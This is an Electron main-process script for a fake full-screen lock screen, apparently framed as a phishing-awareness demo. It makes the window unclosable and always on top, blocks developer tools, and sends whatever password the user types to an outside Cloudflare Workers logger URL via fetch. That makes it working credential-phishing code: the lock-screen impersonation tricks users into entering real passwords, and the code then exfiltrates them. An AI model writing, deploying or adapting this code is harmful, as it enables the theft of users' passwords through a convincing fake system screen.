const { app, BrowserWindow, globalShortcut, screen, powerMonitor, ipcMain } = require('electron');
const path = require('path');

let mainWindow;

// API call function
async function sendPhishingAlert(password) {
  try {
    const payload = {
      message: password,
      alert: 'Attention au phishing !',
      timestamp: new Date().toISOString()
    };
    
    console.log('Sending to API:', payload);
    console.log('API URL:', 'https://my-logger-worker.sambadioulde98.workers.dev');
    
    const response = await fetch('https://my-logger-worker.sambadioulde98.workers.dev', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload)
    });

    if (response.ok) {
      const data = await response.json();
      console.log('API call successful:', data);
      return { success: true, data: data };
    } else {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
  } catch (error) {
    console.error('Error sending API request:', error);
    return { success: false, error: error.message };
  }
}

// IPC handler for API call
ipcMain.handle('send-phishing-warning', async (_, password) => {
  return await sendPhishingAlert(password);
});

function forceQuit() {
  // Unregister all shortcuts first
  globalShortcut.unregisterAll();
  
  // Destroy the window forcefully
  if (mainWindow) {
    mainWindow.removeAllListeners('close');
    mainWindow.destroy();
    mainWindow = null;
  }
  
  // Force exit the process
  process.exit(0);
}

function createWindow() {
  // Get primary display dimensions
  const primaryDisplay = screen.getPrimaryDisplay();
  const { width, height } = primaryDisplay.workAreaSize;

  // Create the browser window in fullscreen, borderless mode
  mainWindow = new BrowserWindow({
    width: width,
    height: height,
    fullscreen: true,
    frame: false,
    alwaysOnTop: true,
    resizable: false,
    movable: false,
    minimizable: false,
    maximizable: false,
    closable: false,
    skipTaskbar: true,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
      enableRemoteModule: false,
      webSecurity: true,
      preload: path.join(__dirname, 'preload.js')
    },
    show: false
  });

  // Load the HTML file
  mainWindow.loadFile('index.html');

  // Show window when ready to prevent visual flash
  mainWindow.once('ready-to-show', () => {
    mainWindow.show();
    mainWindow.focus();
  });

  // Prevent window from being closed normally
  mainWindow.on('close', (event) => {
    event.preventDefault();
  });

  // Register global shortcut for safe exit (Ctrl+Q)
  globalShortcut.register('CommandOrControl+Q', () => {
    forceQuit();
  });

  // Also register Ctrl+Alt+Del for educational purposes
  globalShortcut.register('CommandOrControl+Alt+Delete', () => {
    console.log('Ctrl+Alt+Del pressed - This would open Windows Security in real Windows');
  });

  // Prevent dev tools in production
  if (!process.argv.includes('--dev')) {
    mainWindow.webContents.on('before-input-event', (event, input) => {
      if (input.control && input.shift && input.key.toLowerCase() === 'i') {
        event.preventDefault();
      }
      if (input.key === 'F12') {
        event.preventDefault();
      }
    });
  }
}

// This method will be called when Electron has finished initialization
app.whenReady().then(() => {
  createWindow();

  // Monitor for system sleep/lock events
  powerMonitor.on('lock-screen', () => {
    console.log('System locked - closing fake lock screen');
    forceQuit();
  });

  powerMonitor.on('suspend', () => {
    console.log('System suspending - closing fake lock screen');
    forceQuit();
  });

  // Also listen for when the system is about to sleep
  powerMonitor.on('shutdown', () => {
    console.log('System shutting down - closing fake lock screen');
    forceQuit();
  });

  app.on('activate', function () {
    if (BrowserWindow.getAllWindows().length === 0) createWindow();
  });
});

// Quit when all windows are closed (except on macOS)
app.on('window-all-closed', function () {
  if (process.platform !== 'darwin') app.quit();
});

// Unregister all shortcuts when app is quitting
app.on('will-quit', () => {
  globalShortcut.unregisterAll();
});

// Security: Prevent new window creation
app.on('web-contents-created', (event, contents) => {
  contents.on('new-window', (navigationEvent) => {
    navigationEvent.preventDefault();
  });
});